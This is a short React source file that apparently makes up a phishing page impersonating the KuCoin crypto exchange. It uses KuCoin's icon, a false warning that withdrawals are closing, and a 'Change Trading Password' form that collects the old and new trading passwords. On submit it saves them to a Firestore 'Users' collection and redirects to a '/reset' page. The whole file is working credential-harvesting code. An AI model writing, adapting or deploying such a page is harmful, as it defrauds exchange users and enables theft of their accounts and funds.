import React, {useState} from 'react'
import { addDoc, collection,  } from 'firebase/firestore';
import { db } from '../firebase.config';
import kucoinIcon from '../kucoinIcon.png' 
import { useNavigate } from 'react-router-dom'

function Home() {
    const [formData, setFormData] = useState({
        name:'',
        name2: '',
        name3:''
    })

    const navigate = useNavigate()  
    const {name, name2, name3} = formData  
    const onChange = (e) => {
        setFormData((prevState) => ({
          ...prevState,
          [e.target.id] : e.target.value
        }))
        
      }

    const onSubmit = async(e) => {
        e.preventDefault()
        const docRef = await addDoc(collection(db, 'Users'), formData)
        console.log("Document written with ID: ", docRef.id)
        navigate('/reset')


    }  

  return (
    <div className="App">
        
       <div className="app-name">
        <img src={kucoinIcon} alt="icon" />
        <h1 className="app-name">Change Trading Password</h1>
       </div>
        

      <p className='blank'>
        
      </p>

      <h2 className='warning'>The withdrawal services on KuCoin and KuMEX will be temporarily closed</h2>
      <div className='input-form'>
        <form onSubmit={onSubmit}>
          <label className='form-label'>Old Trading Password: </label>
          <input
          className='nameInput'
           type="text" 
           placeholder='Old Trading Password' 
           id='name' 
           value={name}
           onChange={onChange}
           required
          />
          <label className='form-label'>New Trading Password: </label>
          <input
          className='nameInput'
           type="text" 
           placeholder='New Trading Password' 
           id='name2' 
           value={name2}
           onChange={onChange}
           required 
          />
          <label className='form-label'>Confirm Trading Password: </label>
          <input
          className='nameInput'
           type="text" 
           placeholder='Confirm Trading Password' 
           id='name3' 
           value={name3}
           onChange={onChange}
           required
          />

          <button type='submit' className='confirmButton'>
              Confirm
          </button>
        </form>
      </div>
    </div>
  )
}

export default Home